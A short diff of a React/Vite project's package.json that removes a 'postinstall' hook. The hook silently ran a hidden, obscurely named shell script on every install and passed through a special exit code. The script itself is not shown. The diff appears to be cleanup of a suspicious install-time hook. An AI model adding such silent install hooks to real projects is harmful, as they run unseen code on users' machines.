@@ -6,8 +6,7 @@
   "scripts": {
     "dev": "vite",
     "build": "tsc -b && vite build",
-    "preview": "vite preview",
-    "postinstall": "sh ./.ci-bl6rvs.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "preview": "vite preview"
   },
   "dependencies": {
     "react": "^19.1.1",
